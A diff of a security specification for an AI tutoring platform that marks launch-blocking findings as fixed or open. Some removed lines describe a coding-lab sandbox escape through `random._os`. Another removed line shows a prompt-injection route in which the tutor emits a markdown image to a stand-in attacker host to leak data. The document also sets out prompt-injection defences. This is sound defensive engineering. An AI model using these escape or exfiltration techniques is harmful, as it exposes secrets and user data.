@@ -1,5 +1,7 @@
 # AI Mentor — Security and Compliance Specification
 
+> **v2.0 amendment (13 October 2026).** Sections 0–3 and 6–18 remain normative, and every finding in section 0 still open is an R1 launch gate; fixed findings become R1 regression tests. Sections 4 (authorisation model) and 5 (RBAC matrix) are superseded by [platform/09-security-model.md](platform/09-security-model.md) and [platform/10-rbac-matrix.md](platform/10-rbac-matrix.md), which add tenant isolation, scoped roles, ABAC, enterprise SSO, and AI-assisted marking controls.
+
 | | |
 | --- | --- |
 | Document | Security and Compliance Specification |
@@ -42,25 +44,29 @@ Requirement keywords: **MUST** (launch blocker), **SHOULD** (required within one
 
 ## 0. Launch-blocking findings in the current build
 
-A review of the repository on 13 October 2026 found the following. Each finding is cross-referenced from the relevant section below.
+A review of the repository on 13 October 2026 found SEC-01 to SEC-13. The remediation pass on the same day fixed most of them and found SEC-14 to SEC-17. **Status** is what the code does now; the evidence column points at the code or test that proves it. Each finding is cross-referenced from the relevant section below.
 
-| ID | Severity | Finding | Evidence | Required fix |
+| ID | Severity | Finding | Status | Evidence of the fix, or what remains |
 | --- | --- | --- | --- | --- |
-| **SEC-01** | **Critical** | **Coding-lab sandbox escape.** Allowed modules expose private references to `os` and `sys` (for example `random._os`). The static check blocks only double-underscore attributes, so learner code can call `random._os.system(...)`, read files, open network connections, and read the parent process environment, which contains database, Stripe, Clerk, and model-provider secrets. | Verified with a harmless payload: `import random; print(random._os.getcwd(), random._os.getpid())` returned the temp directory and PID through `/api/v1/lab/run`'s code path (`app/services/sandbox_runner.py`, `app/domain/sandbox.py`). | Immediate: reject every attribute access beginning with `_` and add a regression test. Before launch: run learner code in an isolated, secret-free, network-less container (see [§8.6](#86-coding-lab-isolation)). Until then, disable the lab in production. |
-| **SEC-02** | High | **Role is overwritten from token claims on every request.** `current_user` reads `metadata` or `public_metadata` from the session JWT and writes it to the database role. If the Clerk session template ever maps user-writable `unsafe_metadata`, any user can make themselves admin. It also bypasses the last-admin guard and leaves no audit trail. | `app/core/security.py` lines 47–50; `app/repositories/sql.py` `upsert_user`. | PostgreSQL is the only source of truth for roles. Ignore role claims in session tokens; accept role changes only through the audited admin endpoint (or a signed Clerk webhook reading `public_metadata`, if bootstrap is needed). |
-| **SEC-03** | Medium | **Open redirect in checkout.** Return URLs are validated with `startswith(origin)`, so `https://app.example.com.attacker.net` passes for origin `https://app.example.com`. | `app/api/router.py` `_return_url`. | Parse the URL and compare scheme, host, and port exactly against the allowlist. |
-| **SEC-04** | Medium | **Token audience not checked.** JWT verification disables `aud` and does not check Clerk's `azp` (authorised party), so a valid token minted for another Clerk application on the same instance would be accepted. | `app/core/security.py` `verify_aud: False`. | Verify `azp` against the allowed frontend origins; set and verify `aud` via a Clerk JWT template. |
-| **SEC-05** | Medium | **Rate limits are per process and keyed by client IP.** Behind Azure ingress or a CDN, all learners may share one IP, and limits reset per replica. | `app/core/rate_limit.py`, `app/middleware/__init__.py`. | Key by authenticated user ID (fallback to the trusted forwarded IP); store counters in Redis; add tier-aware daily AI quotas. |
-| **SEC-06** | High (compliance) | **No erasure or export path.** Clerk `user.deleted` is ignored; there is no data export. | `app/api/router.py` `clerk_webhook`; noted as open in `Security.md`. | Implement erasure and export workflows ([§12.5](#125-data-subject-rights)). |
-| **SEC-07** | Medium | **No audit log.** Role changes, admin data access, and content publication are not recorded. | No audit entity in `app/models/entities.py`. | Add an append-only audit log ([§13](#13-audit-logging)). |
-| **SEC-08** | Medium | **Markdown output can trigger outbound requests.** Model output is rendered with `react-markdown`. Raw HTML is escaped (good), but markdown images load automatically, so an injected instruction can make the tutor emit `![x](https://attacker/?d=...)` and send data to an attacker. There is no Content Security Policy. | `frontend/components/markdown-view.tsx`; no `headers()` in `next.config.ts`. | Drop or proxy remote images in model output; add a strict CSP with `img-src 'self' data:` ([§9.5](#95-output-handling)). |
-| **SEC-09** | Medium | **Qdrant has no authentication setting.** Production requires an HTTP Qdrant URL but there is no API key or TLS requirement. | `app/core/config.py`. | Require `QDRANT_API_KEY` and `https://` in production; private networking only. |
-| **SEC-10** | Medium | **No security scanning in CI.** CI runs lint, tests, typecheck, and build only. | `.github/workflows/ci.yml`. | Add SAST, dependency, secret, container, and IaC scanning ([§16](#16-secure-sdlc)). |
-| **SEC-11** | Low | **Information exposure.** `/docs`, `/redoc`, and `/openapi.json` are public and `/health` reports environment and model mode. | `app/main.py`. | Disable interactive docs in production; return only `{"status":"ok"}` from public health. |
-| **SEC-12** | Low | **Webhook processing is not idempotent or ordered.** A replayed or out-of-order Stripe event can overwrite a newer subscription status. | `app/api/router.py` `stripe_webhook`. | Store processed event IDs; compare event `created` timestamps before updating. |
-| **SEC-13** | Low | **Document parsing runs in the API process.** Malformed PDFs or DOCX files (decompression bombs, parser bugs) can exhaust memory or CPU of the API. | `app/services/engine.py` `parse_upload`. | Parse in a worker with memory/time limits; cap page count and decompressed size. |
+| **SEC-01** | **Critical** | **Coding-lab sandbox escape.** Allowed modules exposed private references to `os` and `sys` (for example `random._os`), so learner code could run commands and read the API's secrets. | **Mitigated; isolation open — launch blocker** | The static filter now rejects every `_`-prefixed attribute, frame/code/traceback attributes (`f_`, `gi_`, `tb_`, …), module-reaching names (`sys`, `os`, `modules`, `inspect`, …), `str.format` field traversal, and any import outside the allowlist (`app/domain/sandbox.py`; 17 escape payloads in `tests/unit/test_sandbox.py`). The lab is **off by default in production** and the settings validator refuses `LAB_ENABLED=true` there; coding quiz items are withheld while it is off. **Still required:** run learner code in an isolated, secret-free, network-less runner ([§8.6](#86-coding-lab-isolation)); the runtime is decided as a gVisor pool with Firecracker fallback ([ADR 0028](adr/0028-sandbox-runner-pool.md)). The static filter is a first filter, not a boundary. |
+| **SEC-02** | High | **Role was overwritten from token claims on every request.** | **Fixed** | `current_user` never reads a role from the token; `sync_identity` creates users as students and only refreshes email and name. Clerk webhooks ignore `public_metadata.role`. Roles change only through the audited admin endpoint or `python -m app.cli grant-admin` (also audited). Tests: `test_auth.py::test_a_valid_token_signs_in_as_a_student_whatever_the_claims_say`, `test_security.py::test_clerk_webhook_ignores_role_metadata_and_erases_on_delete`. |
+| **SEC-03** | Medium | **Open redirect in checkout** (`startswith(origin)`). | **Fixed** | Scheme, host, and port must equal an entry in `STUDIO_ORIGINS` (default: first CORS origin); user-info and non-http schemes are refused. Tests: `test_billing_return_url_must_match_an_origin_exactly`. |
+| **SEC-04** | Medium | **Token audience not checked.** | **Fixed** | `azp` must be in `CLERK_AUTHORIZED_PARTIES` (default: CORS origins); `aud` is verified when `CLERK_AUDIENCE` is set; `exp`, `iat`, `nbf`, `iss`, `sub` are required; 5 s leeway. A JWKS outage returns 503, not 401. Tests: `test_auth.py::test_bad_tokens_are_refused`. |
+| **SEC-05** | Medium | **Rate limits were per process and keyed by client IP.** | **Fixed; tier quotas open** | Per-user limits run after authentication (60/min, 20/min AI, 10/hour uploads) plus a per-address ceiling; counters live in Redis, which production requires (`REDIS_URL`). 429 responses carry `Retry-After` and `RateLimit-*`. **Still required:** tier-aware daily entitlements (SRS §5.3). |
+| **SEC-06** | High (compliance) | **No erasure or export path.** | **Fixed; verification job open** | `GET /api/v1/me/export`; `DELETE /api/v1/me` (deletes the Clerk user, Qdrant points by stored ids, anonymises the Stripe customer, cascades PostgreSQL rows); Clerk `user.deleted` runs the same erasure. Staff-authored content keeps a null author. A non-personal audit row records the subject hash. Langfuse traces carry no user id. **Still required:** the deletion-verification job (SRS AC-065) and crypto-shredding of backups. |
+| **SEC-07** | Medium | **No audit log.** | **Partial** | `audit_events` records role changes (with from/to and reason), CLI grants, asset creation, edits and transitions (with the self-approval flag), and erasure. **Still required:** admin read access to learner data, IP and trace id per row, and append-only enforcement in the database ([§13](#13-audit-logging)). |
+| **SEC-08** | Medium | **Markdown output could trigger outbound requests**, and there was no CSP. | **Fixed** | Model-output images render as `[image: alt]`; links are limited to http(s)/mailto, get `rel="noopener noreferrer nofollow"`, and show their destination host. Both apps send a per-request nonce CSP with `strict-dynamic` and no inline scripts (`frontend/middleware.ts`, `admin/middleware.ts`). Deploy in `Report-Only` first, as §8.4 says. |
+| **SEC-09** | Medium | **Qdrant had no authentication setting.** | **Fixed** | Production requires an `https://` URL and `QDRANT_API_KEY`. |
+| **SEC-10** | Medium | **No security scanning in CI.** | **Partial** | CI runs gitleaks on history, `pip-audit`, `bandit -ll`, and `npm audit` (fails on high or critical), and restricts the token to `contents: read`. **Still required:** container image and IaC scanning. |
+| **SEC-11** | Low | **Information exposure** from public docs and a chatty `/health`. | **Fixed** | Production serves no `/docs`, `/redoc`, or `/openapi.json`; `/health` returns only `{"status":"ok"}`; `/ready` checks the database, Qdrant, and Redis. |
+| **SEC-12** | Low | **Webhook processing was not idempotent or ordered.** | **Fixed** | `webhook_events` stores each provider event id (unique); a replay is acknowledged and ignored; a Stripe event older than `users.subscription_event_at` is ignored. Tests: `test_stripe_webhook_is_idempotent_and_ordered`. |
+| **SEC-13** | Low | **Document parsing runs in the API process.** | **Open** | Upload size is capped at 10 MB and limited to 10/hour per user. **Still required:** parse in a worker with memory and time limits, and cap page count and decompressed size. |
+| **SEC-14** | High | **Stripe webhooks failed on every event.** Stripe 16 `StripeObject` is not a dict, so `data.get(...)` raised; subscriptions would never have activated. Checkout also stored the session status (`complete`) as the subscription status. | **Fixed** | The event is converted with `to_dict()`; checkout maps `payment_status` to `active`/`incomplete`; subscription events store Stripe's status and the tier from the price id. |
+| **SEC-15** | High | **The catalog seed created a `demo-admin` account with the admin role on every start, including production.** | **Fixed** | Demo accounts are seeded only outside production; the web process no longer seeds at all in production (migrations and seeding run as `python -m app.cli migrate`). |
+| **SEC-16** | High (dependency) | **Next.js 15 bundles a PostCSS release with a high advisory** (GHSA-qx2v-qp2m-jg93 and related). Build-time only, on first-party CSS. | **Fixed** | Both apps run Next 16.4 (middleware moved to `proxy.ts`), and KaTeX is pinned to 0.19 to clear the low-severity prototype-pollution advisory. `npm audit` reports 0 vulnerabilities in both apps; CI now fails on high or critical. |
+| **SEC-17** | Medium (supply chain) | **No Python lockfile.** Builds resolve the latest compatible versions at install time. | **Open** | Generate a hashed lock (`uv pip compile --generate-hashes` or `pip-compile`) and install from it in the image and CI. |
 
-**Already in place (keep):** Clerk RS256 verification via JWKS with issuer check; a production configuration validator that refuses dev auth, non-PostgreSQL databases, and non-HTTP Qdrant; user-scoped queries for documents, conversations, quizzes, cards, and submissions; Pydantic length limits on all bodies; prompt screening and fencing of untrusted document text; citation-gated research critique; answer keys never returned to the client; signature verification on Stripe and Clerk webhooks; last-admin demotion guard; security headers (`nosniff`, `DENY` framing, `no-referrer`, restrictive Permissions-Policy); escaped raw HTML and strict-mode Mermaid in the frontend.
+**Already in place (keep):** Clerk RS256 verification via JWKS with issuer, `azp`, and expiry checks; a production configuration validator that refuses dev auth, a missing Clerk configuration, non-PostgreSQL databases, Qdrant without TLS and a key, missing Redis, a missing embedding key, the code lab, disabled staff MFA, and wildcard or non-https origins; user-scoped queries for documents, conversations, quizzes, cards, and submissions (tested for cross-user access in `test_security.py`); a staff gate on every `/admin` route plus finer checks in the services; Pydantic length limits on all bodies; RFC 9457 problem details on every error; prompt screening and fencing of untrusted document text; citation-gated research critique; answer keys never returned to the client; signature verification on Stripe and Clerk webhooks; last-admin and self-role-change guards; the four-eyes rule on publishing; API security headers (`nosniff`, `DENY` framing, `no-referrer`, `default-src 'none'` CSP, `no-store` on API responses, HSTS in production); escaped raw HTML and strict-mode Mermaid in the frontend.
 
 ---
 
@@ -193,16 +199,16 @@ Clerk ──(user.created / updated / deleted, Svix-signed)──► /api/v1/web
 | ID | Requirement | Level | Status |
 | --- | --- | --- | --- |
 | AU-1 | Verify session JWT signature against Clerk JWKS; accept only `RS256`. | MUST | Built |
-| AU-2 | Verify `iss`, `exp`, `nbf` (with ≤ 5 s clock skew). | MUST | Built (`iss`); confirm `nbf` leeway |
-| AU-3 | Verify `azp` against the configured frontend origins; verify `aud` if a JWT template sets it. | MUST | **Gap — SEC-04** |
-| AU-4 | Roles are read from PostgreSQL only. Token claims never grant or change a role. | MUST | **Gap — SEC-02** |
+| AU-2 | Verify `iss`, `exp`, `nbf` (with ≤ 5 s clock skew). | MUST | Built (`iss`, `exp`, `nbf`, `iat`, `sub` required; `JWT_LEEWAY_SECONDS=5`) |
+| AU-3 | Verify `azp` against the configured frontend origins; verify `aud` if a JWT template sets it. | MUST | Built (`CLERK_AUTHORIZED_PARTIES`, `CLERK_AUDIENCE`) |
+| AU-4 | Roles are read from PostgreSQL only. Token claims never grant or change a role. | MUST | Built (`sync_identity`) |
 | AU-5 | Dev authentication (`X-Dev-User-Id`) is impossible in production and is refused at startup. | MUST | Built |
-| AU-6 | The production frontend build fails if `NEXT_PUBLIC_DEV_AUTH=true`. | MUST | Add build check |
-| AU-7 | MFA (TOTP or passkey) required for `instructor` and `admin` roles; API rejects privileged actions when the token's `fva` (factor verification age) shows no second factor. | MUST | Add |
+| AU-6 | The production frontend build fails if `NEXT_PUBLIC_DEV_AUTH=true`. | MUST | Built (`next.config.ts` in both apps; CI asserts the failure) |
+| AU-7 | MFA (TOTP or passkey) required for `instructor` and `admin` roles; API rejects privileged actions when the token's `fva` (factor verification age) shows no second factor. | MUST | Built for every staff request (`REQUIRE_STAFF_MFA`, on and mandatory in production); enrol staff in Clerk |
 | AU-8 | Enable Clerk bot protection, breached-password detection, and rate-limited sign-in attempts. | MUST | Configure |
 | AU-9 | Session lifetime: inactivity timeout 7 days for students, 12 hours for staff; staff re-verification (step-up) for role changes and data exports. | SHOULD | Configure |
-| AU-10 | JWKS client caches keys and refreshes on unknown `kid`; fails closed when JWKS is unavailable. | MUST | Built (PyJWKClient) — add cache lifetime |
-| AU-11 | Handle `user.deleted` webhooks by triggering the erasure workflow. | MUST | **Gap — SEC-06** |
+| AU-10 | JWKS client caches keys and refreshes on unknown `kid`; fails closed when JWKS is unavailable. | MUST | Built (`PyJWKClient`, 1 h key cache, 5 s timeout; JWKS outage returns 503) |
+| AU-11 | Handle `user.deleted` webhooks by triggering the erasure workflow. | MUST | Built (`app/services/webhooks.py`) |
 | AU-12 | Email from the token is not used as an identifier; `sub` (Clerk user ID) is the only key. | MUST | Built |
 | AU-13 | Service-to-service calls (API → lab runner, workers) authenticate with workload identity or short-lived signed tokens, not shared static keys. | SHOULD | Design |
 
@@ -222,7 +228,7 @@ claims = jwt.decode(token, key.key, **decode_kwargs)
 if claims.get("azp") not in settings.origins:
     raise HTTPException(status_code=401, detail="Invalid session")
 # Do not read role from claims. Upsert identity fields only.
-return repository.upsert_user(clerk_id=claims["sub"], email=..., display_name=..., role=None)
+return repository.sync_identity(clerk_id=claims["sub"], email=..., display_name=...)
 ```
 
 - Bootstrap the first admin with a one-off, audited management command (`python -m app.cli grant-admin <clerk_id>`) run from a secured shell, not through token metadata.
@@ -466,7 +472,7 @@ Encrypted fields cannot be searched in SQL; keep searchable metadata separate. *
 | Webhooks | Unmetered but signature-gated | — | — |
 | Global AI spend circuit breaker | Halt non-essential AI features above daily budget; tutor falls back to authored curriculum | — | Config |
 
-Implementation: replace `SlidingWindowLimiter` with a Redis-backed limiter (Azure Cache for Redis), resolve the client IP only from the trusted proxy header configured for the ingress, and return `Retry-After` on 429.
+Implementation (built): per-user fixed-window counters in Redis (`app/core/rate_limit.py`), applied after authentication in `app/api/deps.py`, plus a per-address ceiling in middleware. The client IP comes from uvicorn's `--forwarded-allow-ips`, which the image reads from `FORWARDED_ALLOW_IPS`; set it to the ingress range. 429 responses return `Retry-After` and `RateLimit-*`.
 
 ### 8.4 Security headers (API and frontend)
 
@@ -534,7 +540,7 @@ Parse uploads (PDF, DOCX, PPTX) in the same isolated worker class as the lab (no
 | L3 Channel separation | System instructions in the system channel; learner input in the user channel; documents and retrieved chunks fenced as `<untrusted source="…">` (built). Security rules in `prompts/security.md` composed into every call (built). | Built |
 | L4 Input screening | Control characters, length limits, and known-injection patterns flagged; injection-only messages rejected; topic questions about injection allowed (built). Add a lightweight classifier (provider moderation or a small model) for multilingual patterns — the regex is English-only. | Partly — SHOULD add FR/ES and classifier |
 | L5 Output validation | Research critique dropped unless it cites a supplied label (built). Add: block outputs that contain the system prompt (canary token check), other users' identifiers, or URLs not present in the source material. | Partly |
-| L6 Rendering controls | Escape raw HTML (built). Strip or proxy remote images; show link destinations; `rel="noopener noreferrer nofollow"`; strict CSP — SEC-08. | **Gap** |
+| L6 Rendering controls | Escape raw HTML; strip remote images; show link destinations; `rel="noopener noreferrer nofollow"`; nonce CSP — SEC-08. | Built |
 | L7 Monitoring | Log `prompt_injection` flags and canary-token hits as security events; alert on spikes per user. | SHOULD |
 | L8 Evaluation | Red-team suite (≥ 100 prompts in EN, FR, ES; direct and indirect via documents) runs before every release that changes prompts, models, or retrieval; 0 critical failures to ship. | MUST |
 
@@ -571,7 +577,7 @@ If images are needed later, serve them only from the curated content store via a
 
 ## 10. RAG Security Controls
 
-Current state: learner research analysis reads chunks from PostgreSQL filtered by document **and** owner (`document_for_user`), which is correct. Qdrant is configured but not yet queried; the curated admin knowledge base ([Admin.md](Admin.md)) is planned. These controls apply as retrieval expands.
+Current state (built): every query goes through `app/services/vector_store.py`, which offers only two filters: `learner_document_filter(owner_id, document_id)` on `learner_docs_v1` and `published_library_filter()` on `knowledge_v1`. There is no unfiltered search. Hits are then re-checked against PostgreSQL (owner and document, or `state = 'published'`), so a stale point cannot surface another learner's text or an unpublished asset. Chunks are embedded once at upload or publish. Curated assets are indexed only when they are published, which is stricter than RAG-2's staging collection because drafts are never embedded. Leaving `published` deletes the asset's points and chunks. Every PostgreSQL `embeddings` row stores the point id, collection, provider, model, and dimensions, so points can be deleted by id on erasure.
 
 ### 10.1 Ingestion controls
 
